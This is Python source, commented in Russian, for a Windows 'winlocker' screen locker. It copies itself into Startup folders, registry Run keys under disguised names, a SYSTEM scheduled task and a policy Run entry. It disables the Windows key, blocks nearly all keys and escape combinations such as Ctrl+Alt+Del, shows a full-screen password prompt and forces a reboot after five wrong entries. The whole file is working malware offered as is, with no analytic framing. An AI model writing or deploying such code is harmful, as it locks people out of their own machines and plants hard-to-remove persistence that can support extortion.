import tkinter as tk
import threading
import time
import os
import sys
import shutil
import subprocess
import ctypes
import random

# ========== НАСТРОЙКИ ==========
PASSWORD = "12345GOG"
attempts = 0
MAX_ATTEMPTS = 5
# ================================

# ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# ========== МЕГА-АВТОЗАГРУЗКА ==========

def add_to_startup_mega():
    """Добавляет программу в 7+ мест"""
    try:
        if getattr(sys, 'frozen', False):
            current_file = sys.executable
        else:
            current_file = os.path.abspath(__file__)
        
        # 1. Папка Startup
        startup_folder = os.path.join(os.environ['APPDATA'], 
                                      'Microsoft', 'Windows', 'Start Menu', 
                                      'Programs', 'Startup')
        dest_path = os.path.join(startup_folder, "winlocker.exe")
        shutil.copy2(current_file, dest_path)
        
        # 2-3. Реестр HKCU (две записи)
        subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinLocker1" /t REG_SZ /d "{dest_path}" /f', shell=True)
        subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "{dest_path}" /f', shell=True)
        
        if is_admin():
            # 4-5. Реестр HKLM (две записи)
            subprocess.run(f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinLocker2" /t REG_SZ /d "{dest_path}" /f', shell=True)
            subprocess.run(f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SecurityService" /t REG_SZ /d "{dest_path}" /f', shell=True)
        
        # 6. Планировщик задач
        subprocess.run(f'schtasks /create /tn "WinLockerTask" /tr "{dest_path}" /sc onlogon /ru "SYSTEM" /f /rl HIGHEST', shell=True)
        
        # 7. Политика запуска
        subprocess.run(f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run" /v "WinLockerPolicy" /t REG_SZ /d "{dest_path}" /f', shell=True)
        
        # 8. Альтернативная папка Startup
        alt_startup = os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if os.path.exists(alt_startup):
            shutil.copy2(current_file, os.path.join(alt_startup, "winlocker.exe"))
            
    except:
        pass

# ========== ТОТАЛЬНАЯ БЛОКИРОВКА КЛАВИШ ==========

def block_everything_total():
    """Блокирует всё, кроме букв/цифр в поле ввода"""
    try:
        import keyboard
        
        all_keys = [
            'alt', 'ctrl', 'shift', 'windows', 'delete', 'escape', 'tab', 'enter',
            'backspace', 'space', 'caps_lock', 'num_lock', 'scroll_lock',
            'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
            'up', 'down', 'left', 'right', 'home', 'end', 'page_up', 'page_down',
            'insert', 'print_screen', 'pause', 'menu', 'alt gr', 'win', 'apps'
        ]
        
        for key in all_keys:
            try: keyboard.block_key(key)
            except: pass
        
        all_combos = [
            'alt+f4', 'ctrl+alt+del', 'ctrl+shift+esc', 'ctrl+esc',
            'alt+tab', 'windows+r', 'windows+e', 'windows+d', 'windows+l',
            'windows+tab', 'windows+space', 'windows+up', 'windows+down',
            'alt+space', 'ctrl+c', 'ctrl+v', 'ctrl+x', 'ctrl+z',
            'ctrl+a', 'ctrl+s', 'ctrl+o', 'ctrl+p', 'ctrl+w',
            'ctrl+tab', 'ctrl+shift', 'alt+shift', 'win+space',
            'alt+enter', 'shift+f10', 'ctrl+alt+tab'
        ]
        
        for combo in all_combos:
            try: keyboard.add_hotkey(combo, lambda: None)
            except: pass
    except ImportError:
        pass

# ========== БЛОКИРОВКА WIN KEY ==========

def block_windows_key_forever():
    try:
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f', shell=True)
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoWindowsHotKeys /t REG_DWORD /d 1 /f', shell=True)
        if is_admin():
            subprocess.run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoWinKeys /t REG_DWORD /d 1 /f', shell=True)
    except:
        pass

# ========== ОКНО ==========

root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.configure(bg='black')
root.overrideredirect(True)

canvas = tk.Canvas(root, width=root.winfo_screenwidth(), 
                  height=root.winfo_screenheight(), 
                  bg='black', highlightthickness=0)
canvas.pack()

# ========== ИНТЕРФЕЙС ==========

def draw_ui():
    canvas.delete("all")
    
    width = root.winfo_screenwidth()
    height = root.winfo_screenheight()
    cx = width // 2
    cy = height // 2
    
    # Фоновый код
    for i in range(30):
        x = random.randint(0, width)
        y = random.randint(0, height)
        canvas.create_text(x, y, text=random.choice(['0x7F', '0x1F']), 
                          fill='#0a3a0a', font=("Courier", random.randint(8, 14)))
    
    # Панель
    canvas.create_rectangle(cx-280, cy-130, cx+280, cy+180, 
                          outline='#00ff00', width=4, fill='#001100')
    
    canvas.create_text(cx, cy-70, text="⛔ SYSTEM LOCKED ⛔", 
                      fill='#00ff00', font=("Courier", 28, "bold"))
    
    canvas.create_text(cx, cy, text=f"ATTEMPTS: {attempts}/{MAX_ATTEMPTS}", 
                      fill='#00ff00', font=("Courier", 16))
    
    canvas.create_text(cx, cy+60, text="ENTER PASSWORD:", 
                      fill='#00ff00', font=("Courier", 14))
    
    # Предупреждение о перезагрузке
    if attempts > 0:
        remaining = MAX_ATTEMPTS - attempts
        canvas.create_text(cx, cy+140, text=f"{remaining} attempts until FORCED REBOOT", 
                          fill='red', font=("Courier", 10))

# ПОЛЕ ВВОДА
entry = tk.Entry(root, font=("Courier", 18), show="*", 
                width=14, justify='center', bg='black', fg='#00ff00', 
                insertbackground='#00ff00', bd=0)
entry.place(relx=0.5, rely=0.65, anchor='center')
entry.focus()

error_label = tk.Label(root, text="", font=("Courier", 11), 
                      fg='#00ff00', bg='black')
error_label.place(relx=0.5, rely=0.75, anchor='center')

# ========== ПРИНУДИТЕЛЬНАЯ ПЕРЕЗАГРУЗКА ==========

def force_reboot():
    """Принудительная перезагрузка через 10 секунд"""
    canvas.delete("all")
    canvas.configure(bg='black')
    
    cx = root.winfo_screenwidth() // 2
    cy = root.winfo_screenheight() // 2
    
    canvas.create_text(cx, cy-100, text="💀 SYSTEM ERROR 💀", 
                      fill='red', font=("Courier", 50, "bold"))
    
    canvas.create_text(cx, cy-20, text="TOO MANY FAILED ATTEMPTS", 
                      fill='red', font=("Courier", 28))
    
    canvas.create_text(cx, cy+40, text="FORCED RESTART IN:", 
                      fill='yellow', font=("Courier", 24))
    
    # Обратный отсчет
    for i in range(10, 0, -1):
        canvas.create_text(cx, cy+100, text=str(i), 
                          fill='red', font=("Courier", 40, "bold"), tags="count")
        root.update()
        time.sleep(1)
        canvas.delete("count")
    
    canvas.create_text(cx, cy+100, text="RESTARTING NOW...", 
                      fill='red', font=("Courier", 20))
    root.update()
    time.sleep(2)
    
    # Принудительная перезагрузка
    try:
        subprocess.run('shutdown /r /t 0 /f', shell=True)
    except:
        os.system('shutdown /r /t 0 /f')

# ========== ПРОВЕРКА ПАРОЛЯ ==========

def check_password(event=None):
    global attempts
    
    if entry.get() == PASSWORD:
        # Восстанавливаем Win key
        try:
            subprocess.run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoWinKeys /f', shell=True)
        except:
            pass
        root.destroy()
        sys.exit()
    else:
        attempts += 1
        error_label.config(text=f"ACCESS DENIED! {attempts}/{MAX_ATTEMPTS}")
        entry.delete(0, tk.END)
        draw_ui()
        
        if attempts >= MAX_ATTEMPTS:
            force_reboot()  # ← ПРИНУДИТЕЛЬНАЯ ПЕРЕЗАГРУЗКА

# ========== ПЕРЕХВАТ КЛАВИШ ==========

def block_all_keys(event):
    if event.keysym == 'Return':
        check_password()
        return "break"
    
    if event.widget == entry and len(event.char) > 0:
        return
    
    return "break"

# ========== ЗАПУСК ==========

draw_ui()
add_to_startup_mega()
block_windows_key_forever()
threading.Thread(target=block_everything_total, daemon=True).start()

root.bind_all('<Key>', block_all_keys)
root.bind_all('<KeyRelease>', block_all_keys)

root.mainloop()